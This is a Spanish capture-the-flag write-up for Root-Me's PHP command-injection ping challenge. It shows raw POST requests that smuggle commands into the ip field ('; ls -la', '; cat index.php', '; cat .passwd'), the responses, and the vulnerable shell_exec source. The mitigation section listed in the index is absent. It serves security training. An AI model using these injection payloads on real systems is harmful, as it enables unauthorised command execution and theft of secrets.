🔐 Writeup: Root-Me - PHP Command Injection (ch54)
📋 Índice

    Descripción del Reto

    Reconocimiento Inicial

    Identificación de la Vulnerabilidad

    Explotación

    Obtención de la Flag

    Análisis del Código Fuente

    Lecciones Aprendidas

    Medidas de Mitigación

📌 Descripción del Reto
Categoría	Web - PHP
Dificultad	Fácil (10 Puntos)
Estado	✅ Completado
Objetivo	Encontrar una vulnerabilidad y leer index.php

El reto presenta un servicio de ping que permite a los usuarios realizar pings a direcciones IP. Nuestro objetivo es explotar una vulnerabilidad para leer archivos del sistema, específicamente index.php y posteriormente la flag.
🔍 Reconocimiento Inicial
1. Análisis del Servicio

Al acceder al servicio, nos encontramos con un formulario simple:
html

<form method="POST" action="index.php">
    <input type="text" name="ip" placeholder="127.0.0.1">
    <input type="submit">
</form>

El servicio ejecuta un ping a la IP proporcionada y muestra la salida.
2. Prueba de Funcionamiento

Request:
http

POST /web-serveur/ch54/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

ip=8.8.8.8

Response:
html

<pre>
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=2.32 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=2.00 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=2.03 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 2.003/2.115/2.317/0.142 ms
</pre>

✅ El servicio funciona correctamente.
🕵️ Identificación de la Vulnerabilidad
Prueba de Inyección de Comandos

El servicio probablemente ejecuta un comando similar a:
bash

ping -c 3 <IP_USUARIO>

Para probar si hay inyección de comandos, usamos el operador ; que permite ejecutar múltiples comandos en Linux:

Payload: 8.8.8.8; ls -la

Request:
http

POST /web-serveur/ch54/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

ip=8.8.8.8%3Bls+-la

    Nota: %3B es la codificación URL de ;, y + representa un espacio.

Response (parte relevante):
text

total 36
drwxr-s--x  2 web-serveur-ch54 www-data  4096 Dec 10  2021 .
drwxr-s--x 99 challenge        www-data  4096 Mar 21  2025 ..
-r--------  1 challenge        challenge   90 Dec 10  2021 ._nginx.http-level.inc
-r--------  1 challenge        challenge  661 Dec 10  2021 ._nginx.server-level.inc
-r--------  1 root             www-data   867 Dec 18  2021 ._perms
-r--------  1 challenge        challenge  218 Dec 10  2021 ._php-fpm.pool.inc
-rw-r-----  1 root             www-data    44 Dec 10  2021 .git
-r--r-----  1 web-serveur-ch54 www-data    23 Dec 10  2021 .passwd
-rw-r-----  1 web-serveur-ch54 www-data   443 Mar  7  2023 index.php

🎯 ¡Vulnerabilidad confirmada! El comando ls -la se ejecutó correctamente.
Archivos de Interés Detectados:

    📄 .passwd (23 bytes) - Posiblemente contiene la flag

    📄 index.php (443 bytes) - Código fuente del servicio

🚀 Explotación
1. Lectura de index.php

Para entender cómo funciona el servicio y dónde se encuentra la flag:

Payload: 8.8.8.8; cat index.php

Request:
http

POST /web-serveur/ch54/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

ip=8.8.8.8%3Bcat+index.php

Response (código fuente extraído):
php

<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>

🔍 Análisis del Código

    Línea 2: La flag se lee del archivo .passwd
    php

    $flag = "".file_get_contents(".passwd")."";

    Línea 4: El comando se construye concatenando la entrada del usuario directamente:
    php

    $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");

    Vulnerabilidad: No hay sanitización ni validación de $_POST["ip"], permitiendo inyección de comandos.

🏆 Obtención de la Flag

Ahora que sabemos que la flag está en .passwd:

Payload: 8.8.8.8; cat .passwd

Request Final:
http

POST /web-serveur/ch54/index.php HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

ip=8.8.8.8%3Bcat+.passwd

Response:
html

<pre>
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=2.17 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=2.04 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=2.11 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 2.039/2.105/2.169/0.053 ms
*****************
</pre>

🎉 ¡Flag Obtenida!
text

******************

📊 Resumen de la Explotación
Paso	Acción	Payload	Resultado
1	Prueba inicial	8.8.8.8	Servicio funciona
2	Confirmar inyección	8.8.8.8; ls -la	Listado de archivos
3	Leer código fuente	8.8.8.8; cat index.php	Código PHP expuesto
4	Obtener flag	8.8.8.8; cat .passwd	Flag obtenida ✅
